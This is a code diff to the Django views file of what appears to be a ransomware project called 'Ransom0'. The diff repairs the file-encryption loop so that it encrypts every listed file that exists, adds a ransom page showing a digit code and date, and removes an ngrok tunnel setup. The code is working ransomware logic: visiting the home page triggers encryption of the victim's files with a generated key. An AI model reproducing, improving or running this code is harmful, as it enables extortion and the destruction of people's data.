@@ -1,5 +1,5 @@
 from django.shortcuts import render
-
+from datetime import datetime
 import os
 import requests
 
@@ -32,24 +32,29 @@ else:
 
 key = Fernet.generate_key()
 digits = randint(1111,9999) 
-ransom0 = start.Ransom0(key,digits)
 
+
+
+
+ransom0 = start.Ransom0(key,digits)
 
 def start_ransom():
     try:
         ransom0.FindFiles()
         filepath = 'logs/path.txt'
         with open(filepath) as fp:
-            line = fp.readline
-            while line:
+            
+            for line in fp:
                 filename = line.strip()
                 try:
-                    ransom0.Encrypt(filename)
+                    if os.path.isfile(filename):
+                        ransom0.Encrypt(filename)
                 except Exception:
-                    print('persmission denien')
-                line = fp.readline
+                    print('persmission denied')
+        
+            
         fp.close()
-        return 'false'
+        print('decrypted : false')
     except FileNotFoundError:
         os.mkdir("logs")   
         f = open("logs/digits.txt","w")
@@ -61,16 +66,13 @@ def start_ransom():
 
 
 def home(request):
-
-    try:
-        
-        url = ngrok.connect(426)
-        print(f"Starting httpd server on {url}")
-        ngrok_tunnel = ngrok.connect() 
-    except KeyboardInterrupt:
-        print('Server is offline')
-        exit()
-
+    now = datetime.now()
+    date = now.strftime("%d/%m/%Y %H:%M:%S")
+    
+    context = {
+        'digits': ransom0.digits,
+        'date': date}
+    
     
     if path.exists('logs') is True:
         f = open('logs/digits.txt','r')
@@ -84,7 +86,7 @@ def home(request):
         f.write(str(digits))
         f.close()
         start_ransom()
-    return render(request,'ransom0/home.html')
+    return render(request,'ransom0/home.html',context)
 
 def decrypt_files(request):
     
